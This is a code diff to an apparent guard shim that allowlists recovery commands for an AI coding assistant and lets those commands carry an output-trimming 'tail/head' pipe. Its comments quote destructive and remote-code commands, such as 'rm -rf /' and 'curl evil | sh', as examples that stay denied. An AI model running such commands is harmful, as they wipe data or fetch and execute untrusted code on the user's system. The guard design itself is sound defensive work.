@@ -18,6 +18,27 @@ export function shimPath(projectRoot: string): string {
     return path.join(projectRoot, '.claude', 'webpieces', 'ai-hook.sh');
 }
 
+// The OUTPUT-CAPTURE TAIL every escape hatch below tolerates — the 2026-07-21 deadlock report, part 2.
+// Every allowlist was anchored to a BARE command, but the way an AI assistant actually spells a
+// diagnostic command is `<cmd> 2>&1 | tail -20` (it trims the output it has to read back). The audit
+// log proves it: `.webpieces/logs/ai-hook-shim.log` has `pnpm install 2>&1 | tail -15` logged as
+// DENY-STALE seconds away from a bare `pnpm install` logged as ALLOW-INSTALL — the same cure, denied
+// for its redirection. A cure that is denied when spelled the natural way reads to the assistant as
+// "the guard blocks its own fix", which is exactly the conclusion it drew before handing the fix back
+// to the human.
+//
+// So each hatch accepts an OPTIONAL trailing `2>&1` and an OPTIONAL pipe into `tail`/`head` carrying at
+// most a line-count flag (`-20`, `-n 20`). Nothing else: the pipe target is one of two literal,
+// read-only pager words and its only argument is digits, so `| sh`, `| curl …`, `| tee /etc/x` and
+// every other operator stay DENIED. Spliced in place of each pattern's old `[[:space:]]*$` tail, so the
+// anchoring at both ends is unchanged. Keep in sync with CAPTURE_TAIL_JS_SRC (locked by a unit test).
+export const CAPTURE_TAIL_ERE =
+    '([[:space:]]+2>&1)?([[:space:]]*\\|[[:space:]]*(tail|head)([[:space:]]+-(n[[:space:]]+)?[0-9]+)?)?[[:space:]]*$';
+
+// JS-regex-source twin of CAPTURE_TAIL_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
+export const CAPTURE_TAIL_JS_SRC =
+    '(\\s+2>&1)?(\\s*\\|\\s*(tail|head)(\\s+-(n\\s+)?[0-9]+)?)?\\s*$';
+
 // Package-manager install commands allowed to pass the fail-closed shim so the assistant can
 // self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
 // the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
@@ -38,14 +59,14 @@ export function shimPath(projectRoot: string): string {
 // along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
 // Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
 export const INSTALLER_ALLOW_ERE =
-    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';
+    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
 // uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
 // commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
 // same deadlock, other side. A unit test asserts the two agree on a sample set.
 export const INSTALLER_ALLOW_JS =
-    /^(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*\s*$/;
+    new RegExp('^(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
 
 // The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
 //
@@ -61,11 +82,11 @@ export const INSTALLER_ALLOW_JS =
 // So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
 // Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
 export const RECOVERY_ALLOW_ERE =
-    '^rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?[[:space:]]*$';
+    '^rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
 export const RECOVERY_ALLOW_JS =
-    /^rm\s+-rf\s+(\.\/)?node_modules\/?(\s*&&\s*(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?\s*$/;
+    new RegExp('^rm\\s+-rf\\s+(\\.\\/)?node_modules\\/?(\\s*&&\\s*(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command we tell the human/assistant to run to recover a corrupt node_modules.
 export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
@@ -89,11 +110,11 @@ export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
 // what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
 // Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
 export const SYNC_ALLOW_ERE =
-    '^git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';
+    '^git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
 export const SYNC_ALLOW_JS =
-    /^git\s+(pull|fetch|merge)(\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*\s*$/;
+    new RegExp('^git\\s+(pull|fetch|merge)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
 
 // The CURE for the committed-shim self-guard (below): regenerate .claude/webpieces/ai-hook.sh from the
 // installed template. Allowed on every fail-closed path — like the installer, it is a webpieces-owned,
@@ -102,11 +123,11 @@ export const SYNC_ALLOW_JS =
 // pnpm/npm/npx; anchored at both ends with only a bare bin name, so no shell operator can ride along.
 // Keep in sync with UPGRADE_SHIM_ALLOW_JS below (locked by a unit test).
 export const UPGRADE_SHIM_ALLOW_ERE =
-    '^(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim[[:space:]]*$';
+    '^(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of UPGRADE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
 export const UPGRADE_SHIM_ALLOW_JS =
-    /^(pnpm|npm|npx)(\s+(exec|run))?\s+wp-upgrade-shim\s*$/;
+    new RegExp('^(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-upgrade-shim' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command we tell the assistant to run to regenerate a reverted/edited committed shim.
 export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';
@@ -128,11 +149,11 @@ export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';
 // literal webpieces-owned paths — so no other file can be read or written and no operator can ride
 // along. Keep in sync with RESTORE_SHIM_ALLOW_JS below (locked by a unit test).
 export const RESTORE_SHIM_ALLOW_ERE =
-    '^cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh[[:space:]]*$';
+    '^cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of RESTORE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
 export const RESTORE_SHIM_ALLOW_JS =
-    /^cp\s+(\.\/)?node_modules\/@webpieces\/ai-hook-rules\/templates\/ai-hook\.sh\s+(\.\/)?\.claude\/webpieces\/ai-hook\.sh\s*$/;
+    new RegExp('^cp\\s+(\\.\\/)?node_modules\\/@webpieces\\/ai-hook-rules\\/templates\\/ai-hook\\.sh\\s+(\\.\\/)?\\.claude\\/webpieces\\/ai-hook\\.sh' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command the self-guard's deny tells the assistant to run. Works on EVERY installed version.
 export const RESTORE_SHIM_CMD =
@@ -340,7 +361,7 @@ const DENY_REASON_SH = `if [ -n "\$BROKEN_BIN" ]; then
   if [ "\${STAGING_N:-0}" -gt 0 ] 2>/dev/null; then
     STAGING_NOTE=" Also found \$STAGING_N orphaned pnpm staging dirs (name_pid_hash) under node_modules - the fingerprint of an install that was killed mid-write."
   fi
-  REASON="❌ webpieces guards are DOWN and every tool call is BLOCKED: \${BIN_NAME} is installed but CRASHED (\$CRASH_MSG). Your node_modules is corrupt or partially written, so the guards cannot run - and they must NOT be silently skipped. NOTE: a plain 'pnpm install' will NOT fix this; pnpm sees the correct version on disk and skips the broken package. Run exactly this, then retry: ${RECOVERY_CMD}\${STAGING_NOTE}"
+  REASON="❌ webpieces guards are DOWN and every tool call is BLOCKED: \${BIN_NAME} is installed but CRASHED (\$CRASH_MSG). Your node_modules is corrupt or partially written, so the guards cannot run - and they must NOT be silently skipped. NOTE: a plain 'pnpm install' will NOT fix this; pnpm sees the correct version on disk and skips the broken package. Run exactly this, then retry: ${RECOVERY_CMD} - it is explicitly ALLOWED through while this guard is up (not a deadlock), so run it YOURSELF rather than handing it to the human.\${STAGING_NOTE}"
 elif [ -n "\$SHIM_STALE" ]; then
   # The committed shim differs from the installed template — reverted or hand-edited. State plainly that
   # this file is webpieces-MANAGED so the reader does not "fix" it by reverting again, and name the ONE
@@ -349,9 +370,16 @@ elif [ -n "\$SHIM_STALE" ]; then
   # >= 0.4.408, so naming it alone left every older repo with a hard block and a command-not-found —
   # so lead with the plain cp of the installed template, which works on every version, and name the
   # version it restores. The bin is mentioned second, as the equivalent when it is present.
+  #
+  # SAY THAT THE CURE IS ALLOWED THROUGH (2026-07-21, part 1): the text asserted a flat "every tool call
+  # is blocked" and then named a command to run — so the reader reasonably concluded the guard would
+  # block its own fix too, never tried it, and handed the "deadlock" to the human. The cure IS
+  # allowlisted (see RESTORE_SHIM_ALLOW_ERE / UPGRADE_SHIM_ALLOW_ERE above); the message just never said
+  # so. The drift branch below has always said it ("git pull/fetch/merge are allowed while this guard is
+  # up") and has never produced that failure — so state it here in the same plain words.
   SHIM_VER_NOTE=""
   [ -n "\$SHIM_TPL_VER" ] && SHIM_VER_NOTE=" (installed version \$SHIM_TPL_VER)"
-  REASON="❌ webpieces-managed file was changed: .claude/webpieces/ai-hook.sh no longer matches the ai-hook.sh template shipped inside the INSTALLED @webpieces/ai-hook-rules\${SHIM_VER_NOTE} (it was reverted or hand-edited). This file is GENERATED and committed by webpieces - it must NOT be reverted or edited by hand, and its fail-closed guard logic cannot be trusted while it differs. Every tool call is blocked until the two files are byte-identical again. Run EXACTLY this to replace the shim with the installed webpieces\${SHIM_VER_NOTE} version of it, then retry: ${RESTORE_SHIM_CMD} - that copy works on EVERY webpieces version and is the whole fix. (Equivalent only if your installed version is 0.4.408 or newer: ${UPGRADE_SHIM_CMD}. Do NOT revert the shim again - if you meant to remove @webpieces/ai-hook-rules, delete its hooks from .claude/settings.json instead.)"
+  REASON="❌ webpieces-managed file was changed: .claude/webpieces/ai-hook.sh no longer matches the ai-hook.sh template shipped inside the INSTALLED @webpieces/ai-hook-rules\${SHIM_VER_NOTE} (it was reverted or hand-edited). This file is GENERATED and committed by webpieces - it must NOT be reverted or edited by hand, and its fail-closed guard logic cannot be trusted while it differs. Every OTHER tool call is blocked until the two files are byte-identical again. Run EXACTLY this to replace the shim with the installed webpieces\${SHIM_VER_NOTE} version of it, then retry: ${RESTORE_SHIM_CMD} - that copy works on EVERY webpieces version and is the whole fix. THIS IS NOT A DEADLOCK: the cure is explicitly ALLOWED through while this guard is up, so run it YOURSELF now - do not hand it back to the human. (Equivalent only if your installed version is 0.4.408 or newer: ${UPGRADE_SHIM_CMD}. Do NOT revert the shim again - if you meant to remove @webpieces/ai-hook-rules, delete its hooks from .claude/settings.json instead.)"
 elif [ -n "\$DRIFT_PKG" ]; then
   # State the two versions and let the reader judge which is stale — do NOT assert a direction. The
   # check is a plain !=, so it fires BOTH ways, and the old text always claimed node_modules was the
